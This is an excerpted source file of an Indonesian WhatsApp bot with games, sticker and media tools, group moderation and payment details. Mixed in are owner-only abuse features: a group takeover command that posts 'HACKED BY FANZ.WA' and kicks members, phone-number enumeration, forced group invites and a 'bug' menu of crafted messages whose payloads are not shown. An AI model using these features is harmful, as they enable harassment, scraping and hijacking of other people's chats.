...
› Create By FanzOfc
› Base Ori FanzOfc - FanzOfc

🌷 KALAU MAU RENAME TARO CREDITS GUA : FanzOfc*/
...
//=================================================//
module.exports = fanz = async (fanz, m, chatUpdate, store) => {
 try {
...
const botNumber = await fanz.decodeJid(fanz.user.id)
...
const groupMetadata = m.isGroup ? await fanz.groupMetadata(from).catch(e => {}) : ''
...
// AntiLink
if (AntiLink) {
linkgce = await fanz.groupInviteCode(from)
...
kice = m.sender
await fanz.groupParticipantsUpdate(from, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
fanz.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
...
userJid: fanz.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, fanz.user.id)
...
fanz.ev.emit('messages.upsert', msg)
}
...
//=================================================//
const sendapk = (teks) => {
fanz.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yoapk FanzOfc')
}
...
//=================================================//
const sendzip = (teks) => {
fanz.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yozip FanzOfc')
}
...
const senddocu = (teks) => {
fanz.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yopdf FanzOfc')
}
...
const sendvn = (teks) => {
fanz.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
...
.on('finish', async () => {
await fanz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
.on('finish', async () => {
await fanz.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "```Success```", gifPlayback: false }, { quoted: m })
...
try {
ppuser = await fanz.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
fanz.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
try {
...
${Array.from(room.jawaban, (jawaban, index) => {
    ...
    ${isSurender ? '' : `Perfect Player`}`.trim()
            fanz.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
        ...
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
        ...
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
        ...
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
	    ...
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
        ...
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
        ...
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
	...
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await fanz.sendButtonText(from, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, fanz.user.name, m)
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    ...
	    if (room.x !== room.o) await fanz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await fanz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    ...
	    fanz.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    ...
	    fanz.sendText(from, `Suit telah dikirimkan ke chat
...
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) fanz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) fanz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) fanz.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    fanz.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    ...
	    if (!roof.pilih2) fanz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) fanz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    ...
	    fanz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot FANZ${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
...
user.afkReason = text
m.reply(`${m.pushName} Hello Saya FanzBotzz${text ? ': ' + text : ''}`)
}
break
case 'nsfw': {
if (!isCreator) return m.reply(mess.owner)
...
const anuala = {
video:fs.readFileSync("./baseikal/video/fanz.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
...
fanz.sendMessage(from, anuala, `FanzOfc${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
caption: `© FanzOfc${buttonkal}`,
} 
fanz.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
...
fanz.sendMessage(from, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
...
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await fanz.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
...
let encmedia = await fanz.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await fanz.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
let encmedia = await fanz.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
...
reply(mess.wait)
mee = await fanz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
fanz.sendImageAsSticker(from, kaytid, m, { packname: global.packname, author: global.author })
break
//==============================================*===//
...
let media = await fanz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
fanz.sendMessage(from, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
 ...
 if (!isCreator) return m.reply(mess.owner)
              ...
              if (qtod === "true") {
try {
pporg = await fanz.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://telegra.ph/file/b6d27c4ce762c9abeec69.jpg'
}
                await fanz.updateProfilePicture(from, { url: pporg }).catch((err) => fs.unlinkSync(pporg))
                }
                await fanz.groupUpdateSubject(from, `HACKED BY FANZ.WA`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
                await fanz.groupUpdateDescription(from, `HACKED BY FANZ.WA`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
await fanz.groupParticipantsUpdate(from, [m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                m.reply(`Gooo!!!`)
...
await fanz.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
...
fanz.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
...
fanz.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
...
let media = await fanz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await fanz.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
...
fanz.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
...
fanz.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
fanz.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
...
fanz.sendMessage(from, ko, { quoted:m })
}
break
case 'getname': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
namenye = await fanz.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
fanz.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
...
fanz.sendMessage(from, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await fanz.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
fanz.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
...
fanz.sendTextWithMentions(from, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Contoh* :\n#penjara FanzOfc [ Lu Sambil Replay Si nmr Target `)
let cret = await fanz.groupCreate(args.join(" "), [])
let response = await fanz.groupInviteCode(cret.id)
fanz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」
...
⭔ Url : ${anu.url}`,
footer: fanz.user.name,
buttons: buttons,
headerType: 4
}
fanz.sendMessage(from, buttonMessage, { quoted: m })
}
break
case "ytmp4":{
if (!isCreator) return m.reply(mess.owner)
...
*FanzOfc*`
m.reply(`${result4}`)
fanz.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'warning': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
fanz.sendMessage(from, { text : `Harap segera melakukan topup saldo untuk renew/perpanjang server di panel FANZOfc.site, 1-3 hari apabila server tidak di perpanjang akan langsung di hapus oleh admin` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
...
fanz.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
...
`${q}`,])
.then((data) => fanz.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
...
let wokwol = await fanz.serializeM(await m.getQuotedObj())
...
if (!isCreator) return m.reply(mess.owner)
 ...
 for (let i of anu) {
 let metadata = await fanz.groupMetadata(i)
...
fanz.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
...
fanz.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'sendlinkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await fanz.groupInviteCode(from)
fanz.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
break
...
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await fanz.groupInviteCode(from)
fanz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
...
fanz.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
fanz.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
...
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} FanzOfc`
let teks = `${q}`
{
fanz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
}
}
break
//=================================================//
...
case 'sound160':
case 'sound161':
fanzgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await fanz.sendMessage(from, { audio: fanzgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//=================================================//
...
if (args[0] === 'close'){
    await fanz.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await fanz.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await fanz.sendButtonText(from, buttons, `Mode Group`, fanz.user.name, m)
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
     if (args[0] === 'open'){
await fanz.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await fanz.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await fanz.sendButtonText(from, buttons, `Mode Edit Info`, fanz.user.name, m)
...
await fanz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
//=================================================//
case 'setppbot': {
...
await fanz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fanz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await fanz.groupUpdateSubject(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
await fanz.groupUpdateDescription(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
...
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await fanz.downloadAndSaveMediaMessage(quoted)
fanz.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await fanz.downloadAndSaveMediaMessage(quoted)
fanz.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
...
fanz.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fanz.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
await fanz.groupParticipantsUpdate(from, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fanz.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fanz.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
...
`.trim()
fanz.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'antilink': {
...
let ceknye = await fanz.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
teksooo += `\n*Total : ${owner.length}*`
fanz.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
//=================================================//
case 'powner': case 'crator':{
fanz.sendContact(from, global.owner, m)
}
break
case 'welcome': {
if (!isCreator) return m.reply(mess.owner)
...
fanz.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
await fanz.sendButtonText(from, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
...
fanz.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
await fanz.sendButtonText(from, buttonsntnsfww, `Iya Tuan Aku Disini 👋 Silahkan Pilih Button di Bawah Yah `, `FanzOfc`, m)
}
}
break
//=================================================//
...
{title: `🔥 BUG MENU`, rowId: `${prefix}pbugmenu`,description: ``},
  {title: `🔥 RANDOM MENU`, rowId: `${prefix}pallmenu`, description: ``},
    {title: `🔥 TEXT MAKER`, rowId: `${prefix}ptextmaker`, description: ``},
      ...
      {title: `🔥 APK FANZOfc`, rowId: `${prefix}FANZOfccoy`, description: ``},
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, fanz.user.name, `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, fanz.user.name, `Silahkan Pilih Game Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'antilonk':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, fanz.user.name, `Silahkan Pilih Antilink Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'welcomeee':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, fanz.user.name, `Silahkan Pilih Welcome Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'angtitox':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, fanz.user.name, `Silahkan Pilih Toxic Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'downloadmenu': {
...
Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6285812373011`)
}
break
...
.then(({data}) => {
fanz.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'jadian': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
...
fanz.sendMessage(from, buttonMessage, {mentions: menst})
}
break
...
if (Input) {
let cekno = await fanz.onWhatsApp(Input)
...
//=================================================//
case 'hwcap': {
if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di FANZ :)')
...
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN FANZ SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
fanz.relayMessage(from, document.message, { messageId: document.key.id })
...
case 'hwcap2': {
if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di FanzOfc :)')
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
		"documentMessage": {
...
"caption": "HELLO KAK SKRIP INI ASLI BUATAN FANZ SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
fanz.relayMessage(from, document.message, { messageId: document.key.id })
...
---------------------------------------
Pricelist Perpanjang Masa Aktif FanzOfc Panel :
...
*[ Administrator]*
contact.FanzOfc.site
Admin1 = 6285812373011
Admin2 = -
Admin3 = -
`)
}
...
//=================================================//
case 'pdana': {
fanz.sendMessage(from, { image: dana,  caption: `DANA : 085812373011` }, { quoted:m })
}
break
case 'pgopay': {
fanz.sendMessage(from, { image: gopay,  caption: `GOPAY : 085812373011` }, { quoted:m })
}
break
case 'pbca': {
fanz.sendMessage(from, { image: rekening,  caption: `Rek BCA : -` }, { quoted:m })
}
break
//=================================================//
...
"documentMessage": {
							...
							"caption": "APLIKASI RESMI FANZOfc",
}
}), { userJid: from })
fanz.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
...
case 'infoFANZOfc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
fanz.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
...
case 'redemcode': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
fanz.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM FANZOfc*
- _TEKAN ICON KOIN/SALDO DIATAS_
- _PILIH KODE REDDEM_
- _MASUKAN KODE YANG DI KIRIM ADMIN_
- _TEKAN REDDEM_

*CREATE SERVER DI FANZOfc PANEL*
...
fanz.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
...
fanz.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'nowa': {
if (!isCreator) return m.reply(mess.owner)
...
var anu = await fanz.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await fanz.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
...
let delb = await fanz.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
...
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf FanzOfc + sambil reply pesan target* \n\n Contoh 2 : yopdf FanzOfc`
m.reply(teksoooo)
}
break
case 'yopdf':{
...
let teks = `${q}`
{
fanz.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
fanz.sendMessage(from, { text : `Haii 👋 Aku FanzBotzz
...
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
kicee = m.sender
await fanz.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
fanz.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
case 'addzip':{
if (!isCreator) return m.reply(mess.owner)
...
teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip FanzOfc + sambil reply pesan target* \n\n Contoh 2 : yozip FanzOfc`
m.reply(teksooooo)
}
break
case 'yozip':{
...
let teks = `${q}`
{
fanz.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendzip': {
...
let teks = `${q}`
{
fanz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk FanzOfc + sambil reply pesan target* \n\n Contoh 2 : yoapk FanzOfc`
m.reply(teksoooooo)
}
break
case 'yoapk':{
...
let teks = `${q}`
{
fanz.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendapk': {
...
let teks = `${q}`
{
fanz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
Lihat list Pesan Dengan ${prefix}listmsg`)
            ...
            case 'sendlist': {
                ...
                fanz.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
...
case 'getmsg': {
                ...
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                fanz.copyNForward(from, msgs[text.toLowerCase()], true)
            }
            break
...
fanz.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
...
let ghd = await fanz.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
...
